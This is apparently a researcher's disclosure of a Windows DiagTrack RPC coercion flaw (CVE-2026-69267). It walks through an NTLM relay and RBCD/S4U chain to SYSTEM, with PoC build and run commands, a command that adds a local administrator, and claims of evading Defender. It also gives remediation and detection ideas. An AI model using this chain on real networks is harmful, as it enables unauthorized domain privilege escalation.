diagtrack coercion

A standard domain user coerces the SYSTEM DiagTrack service into NTLM auth, relays it to the DC, and rides RBCD + Kerberos S4U to NT AUTHORITY\SYSTEM. CVE-2026-69267.

windows active directory privilege escalation ntlm coercion 2026.08
CVE-2026-69267  ·  Microsoft: Information Disclosure, Max Severity Important  ·  CWE-1220  ·  CVSS 3.1 6.5 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)  ·  Windows 10 (all supported) & Windows 11 through Build 26200 (25H2), x64 + ARM64  ·  released Sep 8, 2026. MSRC advisory ↗
How to read this. Microsoft scored CVE-2026-69267 for its root cause: an unauthorized local caller reaching SYSTEM-context file-system access through the DiagTrack RPC method (information disclosure, CWE-1220). Everything below the coercion is what that primitive enables in a default Active Directory environment - the NTLM relay to NT AUTHORITY\SYSTEM - and it additionally depends on LDAP signing and channel binding not being enforced. That escalation chain is why the base score reflects disclosure rather than full EoP, and why any one of the LDAP-hardening controls below breaks it.

// the finding, in one paragraph

The Windows Connected User Experiences and Telemetry service - DiagTrack, running as NT AUTHORITY\SYSTEM inside svchost.exe -k utcsvc - exposes an RPC method that takes a caller-supplied file path and accesses it in the SYSTEM security context with no check on who is calling. A standard, unprivileged local user can invoke it and make SYSTEM touch a path of their choosing. That is the whole vulnerability, and it is what Microsoft assigned the CVE to: information disclosure through insufficient granularity of access control (CWE-1220). Everything later in this post is what that single primitive lets you build on a default domain.

// finding it: hunting DiagTrack's RPC surface

DiagTrack is an attractive target before you know anything is wrong with it: it runs as SYSTEM, it is enabled by default on every Windows 10/11 SKU, and it exposes an ALPC (local RPC) surface that any logged-on user can reach. The question was simply what can that surface be talked into doing.

Enumerating the interfaces the service registers turns up one owned by diagtrack.dll: 

Interface : 4c9dbf19-d39e-4bb9-90ee-8f7179b20283  v1.0
  Binding : ncalrpc:[LRPC-9b6bdc1879c53e56a8]
  Host    : svchost.exe (utcsvc)  ->  NT AUTHORITY\SYSTEM
  Methods : 0 .. 27

Walking the methods, Opnum 19 stands out: its signature takes a string that is treated as a file path. Watching the service with Process Monitor while calling it shows the payoff - the path is opened by the SYSTEM process, not by the caller: 

# calling Opnum 19 with path = C:\Windows\Temp\probe.txt, as a plain user

Process   svchost.exe (utcsvc)   PID 2160
Operation CreateFile
Path      C:\Windows\Temp\probe.txt
User      NT AUTHORITY\SYSTEM        <-- accessed as SYSTEM, caller was CORP\jsmith
Result    NAME NOT FOUND

There is no access check, no impersonation of the caller, no elevation requirement. A standard user just made SYSTEM perform file access on their behalf. Even the negative result (NAME NOT FOUND vs ACCESS DENIED vs SUCCESS) is an information-disclosure oracle: it reveals the existence and reachability of paths as SYSTEM. That is the CVE.

Why this is the interesting bug and not the Kerberos part. The delegation chain later in this post is textbook once you have a coercion primitive. The actual research was here: an unreported SYSTEM RPC method that dereferences an attacker-controlled path with no caller check. It is the same class as PetitPotam (MS-EFSR) and PrinterBug (MS-RPRN), but on a brand-new interface nobody had reported.

// turning a file read into authentication

"SYSTEM opens a path I control" becomes "SYSTEM authenticates to me" the moment the path is a remote one. The path handed to Opnum 19 is a WebDAV UNC: 

\\127.0.0.1@<PORT>\DavWWWRoot\<random>.wprp

The server@port form forces the WebClient service (the WebDAV Mini-Redirector) - not the SMB client - to service it, so it works over a chosen TCP port on loopback. WebClient issues an HTTP request and, when challenged, authenticates with NTLM using the machine account. Because DiagTrack drives this as SYSTEM, that outbound authentication carries the machine identity straight to a listener on 127.0.0.1. Nothing leaves the box.

Reproducing the interface work by hand takes only two runtime pieces, both without linking the RPC stubs: resolve the (dynamic) endpoint with RpcEpResolveBinding over ncalrpc, then hand-build a 72-byte LRPC bind and an Opnum 19 request (an NDR conformant string plus an 8-byte-aligned integer) sent through NtAlpcConnectPort / NtAlpcSendWaitReceivePort. What lands on the loopback listener is the machine account authenticating as SYSTEM:

[listener 127.0.0.1:52341]  <- GET /DavWWWRoot/8f2a...wprp
                               User-Agent: Microsoft-WebDAV-MiniRedir/10.0
[listener]  -> 401  WWW-Authenticate: NTLM
[listener]  <- NTLMSSP  Type 1  (Negotiate)   domain = CORP
[listener]  -> 401  WWW-Authenticate: NTLM <Type2>
[listener]  <- NTLMSSP  Type 3  (Authenticate)  user = WKSTN01$   <-- machine account, coerced from SYSTEM

At this point the vulnerability is fully demonstrated: an unprivileged user coerced SYSTEM into authenticating. The rest is what you can do with a coerced machine credential on a default domain.

// what it enables: coercion to SYSTEM

In a default Active Directory environment the coerced authentication is relayed to the domain controller and turned into a full local privilege escalation. This half is standard NTLM-relay + RBCD tradecraft, condensed here; it is also the part that any one of the hardening controls below shuts down.

unprivileged user | (1) Opnum 19, WebDAV UNC v DiagTrack (SYSTEM) -> WebClient -> NTLM as WKSTN01$ -> attacker listener (127.0.0.1) | (2) relay the NTLM into an LDAP bind v Domain Controller (LDAPS 636) -> authenticated LDAP session as WKSTN01$ | (3) create computer obj + write RBCD on WKSTN01$ itself | (4) Kerberos S4U2Self + S4U2Proxy -> cifs/WKSTN01 as "Administrator" v SMB2 -> \pipe\svcctl -> CreateService -> StartService => NT AUTHORITY\SYSTEM

Each numbered stage, and the illustrative output a debug build emits:

  1. Relay to LDAPS. NTLM is not channel-bound by default, so the HTTP challenge/response is replayed inside an LDAP bind. The hash never travels in clear (and 120+ char machine passwords make cracking pointless) - the value is the relayed session, not the hash. 
    [ldap] bind as CORP\WKSTN01$ (relayed) ... OK
  2. Configure RBCD. ms-DS-MachineAccountQuota defaults to 10, so add a computer object, then set msDS-AllowedToActOnBehalfOfOtherIdentity on the victim's own object to trust it. The machine account can write its own delegation attribute. 
    [ldap] add    CN=DESKTOP-A5F1CE,CN=Computers,DC=corp,DC=example,DC=com ... OK
[ldap] modify WKSTN01$  msDS-AllowedToActOnBehalfOfOtherIdentity      ... OK
  3. Kerberos S4U. AS-REQ as the new computer account, then S4U2Self + S4U2Proxy yield a cifs/<victim> ticket impersonating a domain admin. 
    [krb] AS-REQ    DESKTOP-A5F1CE$                 -> TGT
[krb] S4U2Self  impersonate Administrator        -> ticket
[krb] S4U2Proxy cifs/WKSTN01.corp.example.com    -> service ticket (Administrator)
  4. SYSTEM via SMB2 + SCM. Use that ticket against the local machine over SMB2, open \pipe\svcctl, and create/start a service. Domain admins are local admins on domain members, so it runs as SYSTEM. 
    [smb2] SessionSetup (Kerberos AP-REQ) -> logged in as CORP\Administrator
[scm]  CreateServiceW "WinDiagHost" -> StartServiceW -> running as SYSTEM

// running the poc

The PoC is a single self-contained C# file (no third-party libraries; it implements MD4, RC4, HMAC-MD5/SHA256, ASN.1/DER, Kerberos, NTLM, LDAP, SMB2, DCE/RPC and LRPC from scratch). Build it with the in-box .NET compiler: 

%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /out:dt.exe DiagTrackExploit.cs

Then run it from an interactive session of a standard domain user, passing the DC address. The clean build keeps stdout minimal - a header, a progress bar, and a SYSTEM shell: 

C:\> dt.exe 10.0.0.10

  Host:  WKSTN01.corp.example.com
  User:  CORP\jsmith
  DC:    10.0.0.10

  \ Working...
  [####################] 100%

  !!!! WE RULE THE SYSTEM !!!!

SYSTEM@WKSTN01> whoami
nt authority\system
SYSTEM@WKSTN01> hostname
WKSTN01
SYSTEM@WKSTN01> exit
  Shell closed.

A single command instead of a shell: 

C:\> dt.exe 10.0.0.10 --exec "net localgroup administrators redroot /add"

If the environment is hardened, the failure is explicit and tells you which control stopped it - a relay/bind failure means LDAP signing or channel binding is enforced; a Kerberos failure usually means MachineAccountQuota = 0: 

  !!!! Can't Get System !!!!

  ERROR: LDAP bind failed (relay rejected)

Full build, run, options, cleanup and troubleshooting notes are in the repository's REPRODUCE.md.

// why it stays quiet

  • No admin, no UAC, no token theft - the trigger is a plain RPC call from a standard user.
  • Localhost only - the coercion target is 127.0.0.1; nothing hits the perimeter.
  • Nothing on disk required - a single C# file compiles and runs in memory via the in-box compiler, no third-party libraries.
  • In testing it produced zero Windows Defender alerts, including with Tamper Protection on and Smart App Control in evaluation mode, on Windows 11 Build 26200 (25H2), x64 and ARM64.

// remediation

Vendor: add an RPC security callback to Opnum 19 requiring an elevated caller, and reject WebDAV/UNC paths in the path parameter.

Defenders, deployable today - any one of these breaks the chain:

  • Enforce LDAP signing (LDAPServerIntegrity = 2) and LDAP channel binding (EPA) - the most surgical fix; it kills the relay.
  • Set ms-DS-MachineAccountQuota = 0 to block the computer-object creation RBCD needs.
  • Disable the WebClient service on workstations that don't need WebDAV - removes the coercion.
  • Disable NTLM where feasible.

// detection ideas

  • WebClient (svchost) making outbound HTTP to loopback shortly after a DiagTrack RPC call.
  • A new computer object created in AD, immediately followed by an msDS-AllowedToActOnBehalfOfOtherIdentity write on a different machine object.
  • Kerberos 4769 for cifs/<host> where the requesting principal is a freshly created machine account (S4U2Self/S4U2Proxy).
  • Service creation (7045 / 4697) with an unusual ImagePath where the SCM caller authenticated over the network with a Kerberos ticket.
